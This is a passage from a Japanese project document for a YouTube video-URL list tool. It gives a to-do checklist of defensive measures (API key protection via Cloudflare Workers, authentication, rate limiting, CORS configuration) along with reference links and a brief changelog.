- [ ] データ削除リクエストの仕組みを実装

#### APIキー対策

- [ ] Cloudflare Workers（または Vercel / Firebase）でバックエンドを構築
- [ ] APIキーを環境変数で管理（`wrangler secret put`）
- [ ] `.env` を `.gitignore` に追加
- [ ] `.env.example` でサンプルを提供
- [ ] フロントエンドからバックエンドAPIのみ呼び出す
- [ ] CORS設定を適切に構成

#### 認証・認可

- [ ] Firebase Authentication（または Auth0）を導入
- [ ] ログイン機能を実装
- [ ] トークン検証ロジックを実装
- [ ] レート制限を実装（ユーザーごと、Cloudflare KV 使用）
- [ ] エラーハンドリングを実装

### 💡 検討事項（優先度：低）

- [ ] Cloudflare Workers で自前のCORS Proxyを構築（第三者依存を排除）
- [ ] アクセス解析の追加（Cloudflare Analytics など）
- [ ] チェックボックス式の同意ボタン（より明示的）
- [ ] corsproxy.io に利用規約の解釈を問い合わせる
- [ ] @handle からチャンネルID への解決機能（要 YouTube Data API）

---

## 参考リンク

### 公式ドキュメント

- [YouTube ブランディングガイドライン](https://developers.google.com/youtube/terms/branding-guidelines?hl=ja)
- [YouTube API サービス利用規約](https://developers.google.com/youtube/terms/developer-policies?hl=ja)
- [YouTube API サービス - 開発者ポリシー](https://developers.google.com/youtube/terms/developer-policies-guide?hl=ja)
- [Google プライバシーポリシー](https://policies.google.com/privacy)
- [YouTube 利用規約](https://www.youtube.com/t/terms)

### 使用サービス

- [allorigins.win](https://allorigins.win/) - CORS Proxy（プライマリ）
- [corsproxy.io](https://corsproxy.io/) - CORS Proxy（フォールバック）
- [YouTube RSS Feed](https://www.youtube.com/feeds/videos.xml)
- [Cloudflare Pages](https://pages.cloudflare.com/) - デプロイ先

### セキュリティリソース

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Web Crypto API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Crypto_API)
- [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

---

## 更新履歴

| 日付 | 更新内容 | 担当者 |
|-----|---------|-------|
| 2025-11-11 | 初版作成（元資料から網羅的に整理） | AI Assistant |

---

**このファイルについて**:
- 本ファイルは `Video URL List Toolのセキュリティリスク.md` の対応内容を網羅的に整理したものです
- つまづきポイント、解決策、学びを含めて体系的にまとめています
- 将来的に状況や対策を思い出す際の参考資料として使用してください
- 新しい開発者やAIアシスタントへの引き継ぎ資料としても活用できます
